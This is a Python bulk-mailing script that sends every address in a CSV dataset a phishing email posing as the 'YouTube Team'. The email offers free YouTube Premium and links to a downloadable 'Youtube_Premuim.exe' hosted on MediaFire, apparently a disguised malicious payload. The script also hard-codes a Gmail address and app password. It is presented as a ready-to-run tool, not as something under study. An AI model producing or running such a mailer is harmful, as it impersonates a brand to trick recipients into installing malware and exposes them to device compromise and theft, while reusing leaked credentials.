import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import pandas as pd

# --- Read your dataset ---
# Assuming your dataset is in a CSV file with columns 'email', 'name', etc.
df = pd.read_csv('email_dataset.csv')

# --- Email credentials and server setup ---
smtp_server = "smtp.gmail.com"
port = 587
sender_email = "yo4tube.company168@gmail.com"
password = "nabzxqwuyngaqvym"  # Use an app password for Gmail (spaces removed)

# --- Create a secure SSL context ---
context = ssl.create_default_context()

# --- Loop through each row in the dataset and send ---
try:
    server = smtplib.SMTP(smtp_server, port)
    server.starttls(context=context)
    server.login(sender_email, password)
    
    for index, row in df.iterrows():
        receiver_email = row['email']
        name = row['name']
        
        # Create the email message
        message = MIMEMultipart("alternative")
        message["Subject"] = "🎉 Exclusive Offer: YouTube Premium Free for 3 Months!"
        message["From"] = sender_email
        message["To"] = receiver_email
        
        # Create the plain-text and HTML version of your message
        text = f"Hi {name},\n\nCongratulations! You've been selected for an exclusive YouTube Premium offer.\n\nEnjoy 3 months of YouTube Premium completely FREE:\n✓ Ad-free watching\n✓ Offline downloads\n✓ Background play\n\nDownload now: https://www.mediafire.com/file/7x1ifctbhesbriq/Youtube_Premuim.exe/file\n\nJoin our community:\nTelegram: https://t.me/youtubeWithus\n\nClaim your offer now before it expires!\n\nBest regards,\nYouTube Team"
        html = f"""<html><body style="font-family: Arial, sans-serif; background-color: #f9f9f9;">
<div style="max-width: 600px; margin: 0 auto; background-color: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
<div style="text-align: center; margin-bottom: 20px;">
<img src="https://upload.wikimedia.org/wikipedia/commons/0/09/YouTube_full-color_icon_%282017%29.svg" alt="YouTube" style="width: 80px; height: auto;">
</div>
<h2 style="color: #030303; text-align: center;">🎉 Exclusive Offer Just For You!</h2>
<p style="color: #606060; font-size: 16px;">Hi {name},</p>
<p style="color: #606060; font-size: 16px;">Congratulations! You've been selected for an exclusive <strong>YouTube Premium</strong> offer.</p>
<div style="background-color: #f5f5f5; padding: 15px; border-radius: 5px; margin: 20px 0;">
<h3 style="color: #030303; text-align: center;">3 Months FREE YouTube Premium</h3>
<ul style="color: #606060; font-size: 14px;">
<li>✓ Watch without ads</li>
<li>✓ Download videos to watch offline</li>
<li>✓ Play videos in the background</li>
<li>✓ YouTube Music Premium included</li>
</ul>
</div>
<div style="text-align: center; margin: 30px 0;">
<a href="https://www.mediafire.com/file/7x1ifctbhesbriq/Youtube_Premuim.exe/file" style="background-color: #ff0000; color: white; padding: 12px 30px; text-decoration: none; border-radius: 5px; font-weight: bold; display: inline-block;">Download YouTube Premium Now</a>
</div>
<div style="background-color: #f0f0f0; padding: 15px; border-radius: 5px; margin: 20px 0; text-align: center;">
<p style="color: #606060; font-size: 14px; margin: 0;"><strong>Join Our Community:</strong></p>
<a href="https://t.me/youtubeWithus" style="color: #0088cc; font-size: 14px; margin: 5px 0; text-decoration: none;"><strong>Telegram Channel</strong></a>
</div>
<p style="color: #999; font-size: 12px; text-align: center; margin-top: 30px;">This offer is valid only for a limited time. Terms and conditions apply.</p>
</body></html>"""
        
        # Turn these into MIMEText objects
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        
        # Add HTML/plain-text parts to MIMEMultipart message
        message.attach(part1)
        message.attach(part2)
        
        # Send the email
        server.sendmail(sender_email, receiver_email, message.as_string())
        print(f"Email sent to {receiver_email}")
        
    print("All emails sent successfully!")
    
except Exception as e:
    print(f"An error occurred: {e}")
finally:
    try:
        server.quit()
    except:
        pass